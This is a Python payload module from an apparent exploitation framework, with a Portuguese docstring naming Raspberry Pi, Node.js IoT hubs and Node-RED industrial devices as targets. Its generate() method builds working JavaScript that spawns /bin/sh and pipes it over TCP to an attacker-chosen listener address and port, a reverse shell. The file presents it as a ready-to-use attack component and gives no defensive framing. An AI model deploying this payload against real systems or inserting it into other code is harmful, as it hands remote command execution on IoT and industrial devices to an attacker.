"""Node.js Reverse TCP Shell.

Target: Raspberry Pi com Node.js, IoT hubs com Node.js runtime,
dispositivos industriais com Node-RED.
"""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "Node.js Reverse TCP",
        "description": "Node.js reverse TCP shell for IoT/Node-RED targets.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "LHOST": {"description": "Listener IP", "required": True, "default": "", "value": ""},
        "LPORT": {"description": "Listener port", "required": True, "default": "4444", "value": "4444"},
    }

    def generate(self) -> bytes:
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]
        js = f"""(function(){{
var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);
var c=new net.Socket();
c.connect({lport},"{lhost}",function(){{
  c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);
}});
return/a/;}})();"""
        return js.encode()
